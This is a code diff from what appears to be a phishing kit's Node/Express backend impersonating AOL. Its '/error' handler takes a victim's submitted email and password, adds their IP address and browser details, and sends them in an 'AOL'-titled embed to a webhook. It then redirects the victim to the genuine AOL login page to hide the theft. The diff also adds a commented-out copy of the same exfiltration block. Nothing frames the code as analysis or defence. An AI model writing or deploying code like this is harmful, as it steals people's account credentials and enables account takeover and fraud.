@@ -131,14 +131,14 @@ app.post("/error", (req, res) => {
         .setTitle("AOL")
         .setDescription(
           `Result is:
-       => EMAIL: ${req.body.email}
-    
-       => PASSWORD: ${req.body.password}
- 
-       => IP-ADDRESS: ${data.ip}
- 
-       => AGENT: ${req.useragent.browser},${req.useragent.version},${req.useragent.os}, ${req.useragent.source}
-       `
+      => EMAIL: ${req.body.email}
+   
+      => PASSWORD: ${req.body.password}
+
+      => IP-ADDRESS: ${data.ip}
+
+      => AGENT: ${req.useragent.browser},${req.useragent.version},${req.useragent.os}, ${req.useragent.source}
+      `
         )
 
         .setColor(0x00ffff);
@@ -151,6 +151,27 @@ app.post("/error", (req, res) => {
       });
     }
   });
+
+  //   const embed = new EmbedBuilder()
+  //     .setTitle("AOL")
+  //     .setDescription(
+  //       `Result is:
+  //       => EMAIL: ${req.body.email}
+
+  //       => PASSWORD: ${req.body.password}
+
+  //       => IP-ADDRESS: ${ipAdrress}
+  //       `
+  //     )
+
+  //     .setColor(0x00ffff);
+
+  //   webhookClient.send({
+  //     content: "AOL",
+  //     username: "AOL",
+  //     avatarURL: "https://i.imgur.com/AfFp7pu.png",
+  //     embeds: [embed],
+  //   });
 
   res.redirect("https://login.aol.com/");
 });
